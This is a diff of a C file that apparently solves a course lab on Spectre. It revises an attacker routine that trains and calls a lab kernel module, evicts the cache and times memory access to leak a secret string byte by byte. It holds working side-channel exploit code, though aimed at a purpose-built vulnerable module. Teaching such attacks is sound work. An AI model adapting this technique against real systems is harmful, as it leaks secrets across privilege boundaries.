@@ -7,10 +7,10 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdint.h>
 
-#include "spectre-common.h"
-#include "labspectre.h"
 #include "labspectreipc.h"
+#include "spectre_solution.h"
 
 /*
  * call_kernel_part3
@@ -37,36 +37,35 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
  *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
  *  - shared_memory: A pointer to a region of memory shared with the server
  */
-int run_attacker(int kernel_fd, char *shared_memory) {
+int run_attacker(int kernel_fd, char *shared_memory)
+{
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
-    pm_enable_cycle_count();
-    warmup();
-    CacheStats cache_stats = record_cache_stats();
-
+    //CacheStats cache_stats = generate_cache_stats(1000);
+    //print_cache_stats(cache_stats);
     printf("Launching attacker\n");
+    
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
     {
         char leaked_byte;
-
-        bool leaked = false;
-        while (!leaked){
+        bool found = false;
+        while(!found)
+        {
             for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
             {
-                REPEAT(15) call_kernel_part3(kernel_fd, shared_memory, 0);
+                REPEAT(2) call_kernel_part3(kernel_fd, shared_memory, 1);
                 void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
-                REPEAT(3) flush_address(target_addr);
-                evict_all_cache();
+                REPEAT(10) evict_all_cache();
                 call_kernel_part3(kernel_fd, shared_memory, current_offset);
-                MemoryLevel level = determine_memory_level(cache_stats, target_addr);
-                if (level != DRAM) {
+                uint64_t time = time_access(target_addr);
+                if (time <=  100 /*Plus some padding*/) {
                     leaked_byte = (char)i;
-                    leaked = true;
+                    found = true;
                     break;
                 }
             }
         }
-
+        printf("[Part 3] Found char:%c:\n", leaked_byte);
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
             break;
@@ -74,6 +73,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     }
 
     printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);
+    //destroy_cache_stats(cache_stats);
 
     close(kernel_fd);
     return EXIT_SUCCESS;
